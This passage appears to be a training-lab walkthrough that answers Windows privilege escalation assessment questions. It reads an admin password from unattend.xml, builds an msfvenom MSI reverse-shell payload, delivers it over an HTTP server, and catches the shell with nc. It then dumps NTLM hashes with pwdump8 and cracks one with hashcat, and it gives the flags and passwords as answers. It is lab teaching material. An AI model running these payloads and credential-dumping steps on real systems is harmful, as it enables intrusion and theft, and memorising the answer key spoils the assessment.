05/25/2021  07:57 PM           453,075 setupact.log
05/25/2021  07:54 PM               135 setuperr.log
05/25/2021  07:52 PM           110,848 setupinfo
06/06/2021  12:21 PM             8,231 unattend.xml
05/25/2021  07:52 PM    <DIR>          UnattendGC
01/09/2020  01:25 PM         1,051,664 _s_6B6D.tmp
03/18/2019  08:43 PM           580,788 _s_734D.tmp
03/18/2019  08:43 PM           756,812 _s_75B0.tmp
              16 File(s)      3,404,887 bytes
               5 Dir(s)   5,745,504,256 bytes free
```

Subsequently, students need to read the contents of `unattend.xml`:

Code: cmd

```cmd
type unattend.xml
```

```cmd-session
C:\Windows\Panther>type unattend.xml

<!--*************************************************
Installation Notes
Location: HQ
Notes: OOB installer for Inlanefreight Windows 10 systems.
**************************************************-->

<SNIP>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>
<Value>Inl@n3fr3ight_sup3rAdm1n!</Value>
```

Students will have to search closely in order find the password `Inl@n3fr3ight_sup3rAdm1n!` of the domain account `iamtheadministrator` inside of `unattend.xml`.

Answer: `Inl@n3fr3ight_sup3rAdm1n!`

# Windows Privilege Escalation Skills Assessment - Part II

## Question 2

### "Escalate privileges to SYSTEM and submit the contents of the flag.txt file on the Administrator Desktop"

Students first need to create a malicious `.msi` file on Pwnbox/`PMVPN` with a reverse shell payload:

Code: shell

```shell
msfvenom -p windows/shell_reverse_tcp lhost=PWNIP lport=PWNPO -f msi > aie.msi
```

```shell-session
┌─[eu-academy-1]─[10.10.14.72]─[htb-ac330204@htb-nfqh0lv5es]─[~]
└──╼ [★]$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.72 lport=9443 -f msi > aie.msi

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of msi file: 159744 bytes
```

Subsequently, students need to start a web server to prepare to transfer the malicious `.msi` file:

Code: shell

```shell
python3 -m http.server
```

```shell-session
┌─[eu-academy-1]─[10.10.14.72]─[htb-ac330204@htb-nfqh0lv5es]─[~]
└──╼ [★]$ python3 -m http.server

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Using the previously established RDP session, students need to open PowerShell and download the malicious `.msi` file to the target:

Code: powershell

```powershell
curl http://PWNIP:8000/aie.msi -o "C:\Users\htb-student\Desktop\aie.msi"
```

```powershell-session
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\htb-student> curl http://10.10.14.72:8000/aie.msi -o "C:\Users\htb-student\Desktop\aie.msi"
```

On Pwnbox/`PMVPN`, students need to start an `nc` listener to catch the incoming shell connection, utilizing the same port number that was used in the malicious `.msi` payload:

Code: shell

```shell
nc -lvnp PWNPO
```

```shell-session
┌─[eu-academy-1]─[10.10.14.72]─[htb-ac330204@htb-nfqh0lv5es]─[~]
└──╼ [★]$ nc -lvnp 9443

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9443
Ncat: Listening on 0.0.0.0:9443
```

Students then need to click the `aie.msi` file on the Desktop:

![Windows_Privilege_Escalation_Walkthrough_Image_58.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_58.png)

Subsequently, students will notice that the reverse shell connection has been established successfully on the `nc` listener:

```shell-session
Ncat: Connection from 10.129.43.33.
Ncat: Connection from 10.129.43.33:49676.
Microsoft Windows [Version 10.0.18363.592]
(c) 2019 Microsoft Corporation. All rights reserved.
```

At last, students need to read the flag file "flag.txt", which is under the directory `C:\users\Administrator\desktop\`:

Code: cmd

```cmd
type C:\users\Administrator\desktop\flag.txt
```

```cmd-session
C:\Windows\system32>type C:\users\Administrator\desktop\flag.txt
type C:\users\Administrator\desktop\flag.txt

el3vatEd_1nstall$_v3ry_r1sky
```

Answer: `el3vatEd_1nstall$_v3ry_r1sky`

# Windows Privilege Escalation Skills Assessment - Part II

## Question 3

### "There is 1 disabled local admin user on this system with a weak password that may be used to access other systems in the network and is worth reporting to the client. After escalating privileges retrieve the NTLM has for this user and crack it offline. Submit the cleartext password for this account."

Students first need to download [PwDump8.2](https://download.openwall.net/pub/projects/john/contrib/pwdump/pwdump8-8.2.zip) to Pwnbox/`PMVPN` and then unzip it:

Code: shell

```shell
 wget https://download.openwall.net/pub/projects/john/contrib/pwdump/pwdump8-8.2.zip
 unzip pwdump8-8.2.zip
```

```shell-session
┌─[eu-academy-1]─[10.10.14.72]─[htb-ac330204@htb-nfqh0lv5es]─[~]
└──╼ [★]$ wget https://download.openwall.net/pub/projects/john/contrib/pwdump/pwdump8-8.2.zip

--2022-11-07 15:20:17--  https://download.openwall.net/pub/projects/john/contrib/pwdump/pwdump8-8.2.zip
Resolving download.openwall.net (download.openwall.net)... 195.42.179.206
Connecting to download.openwall.net (download.openwall.net)|195.42.179.206|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 541455 (529K) [application/zip]
Saving to: ‘pwdump8-8.2.zip’

pwdump8-8.2.zip     100%[===================>] 528.76K   855KB/s    in 0.6s    

2022-11-07 15:20:18 (855 KB/s) - ‘pwdump8-8.2.zip’ saved [541455/541455]
┌─[eu-academy-1]─[10.10.14.72]─[htb-ac330204@htb-nfqh0lv5es]─[~]
└──╼ [★]$ unzip pwdump8-8.2.zip 

Archive:  pwdump8-8.2.zip
   creating: pwdump8/
  inflating: pwdump8/README.txt      
  inflating: pwdump8/pwdump8.exe     
```

Subsequently, students need to navigate into the `pwdump8/` directory and start a Python web server:

Code: shell

```shell
cd pwdump8/
python3 -m http.server PWNPO
```

```shell-session
┌─[eu-academy-1]─[10.10.14.72]─[htb-ac330204@htb-nfqh0lv5es]─[~]
└──╼ [★]$ cd pwdump8/
┌─[eu-academy-1]─[10.10.14.72]─[htb-ac330204@htb-nfqh0lv5es]─[~/pwdump8]
└──╼ [★]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Utilizing the previously established RDP session, students need to use PowerShell to transfer `PwDump8.2` to the target:

```powershell
curl http://PWNIP:PWNPO/pwdump8.exe -o "C:\Users\htb-student\Desktop\pwdump8.exe"
```

```powershell-session
PS C:\Users\htb-student> curl http://10.10.14.72:8000/pwdump8.exe -o "C:\Users\htb-student\Desktop\pwdump8.exe"
```

From the reverse shell attained in the last question, students need to run `PwDump8.exe` as the super user:

```shell
C:\Users\htb-student\desktop\pwdump8.exe
```

```shell-session
C:\Windows\system32>C:\Users\htb-student\desktop\pwdump8.exe

PwDump v8.2 - dumps windows password hashes - by Fulvio Zanetti & Andrea Petralia @ http://www.blackMath.it

Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:7796EE39FD3A9C3A1844556115AE1A54
Guest:501:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0
DefaultAccount:503:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0
WDAGUtilityAccount:504:AAD3B435B51404EEAAD3B435B51404EE:AAD797E20BA0675BBCB3E3DF3319042C
mrb3n:1001:AAD3B435B51404EEAAD3B435B51404EE:7796EE39FD3A9C3A1844556115AE1A54
htb-student:1002:AAD3B435B51404EEAAD3B435B51404EE:3C0E5D303EC84884AD5C3B7876A06EA6
wksadmin:1003:AAD3B435B51404EEAAD3B435B51404EE:5835048CE94AD0564E29A924A03510EF
```

Then, students need to copy the hash for `wksadmin`, which is `5835048CE94AD0564E29A924A03510EF`, and crack it with `Hashcat` on Pwnbox/`PMVPN`, utilizing hashmode 1000:

```shell
hashcat -m 1000 5835048CE94AD0564E29A924A03510EF /usr/share/wordlists/rockyou.txt
```

```shell-session
┌─[eu-academy-1]─[10.10.14.72]─[htb-ac330204@htb-nfqh0lv5es]─[~/pwdump8]
└──╼ [★]$ hashcat -m 1000 5835048CE94AD0564E29A924A03510EF /usr/share/wordlists/rockyou.txt 

<SNIP>

5835048ce94ad0564e29a924a03510ef:password1       

Session..........: hashcat
Status...........: Cracked
Hash.Name........: NTLM
Hash.Target......: 5835048ce94ad0564e29a924a03510ef
Time.Started.....: Mon Nov  7 15:27:12 2022 (1 sec)
Time.Estimated...: Mon Nov  7 15:27:13 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    15791 H/s (0.46ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 4096/14344385 (0.03%)
Rejected.........: 0/4096 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 123456 -> oooooo

Started: Mon Nov  7 15:26:06 2022
Stopped: Mon Nov  7 15:27:15 2022
```

From the output of `Hashcat`, students will know that the password's cleartext is `password1`.

Answer: `password1`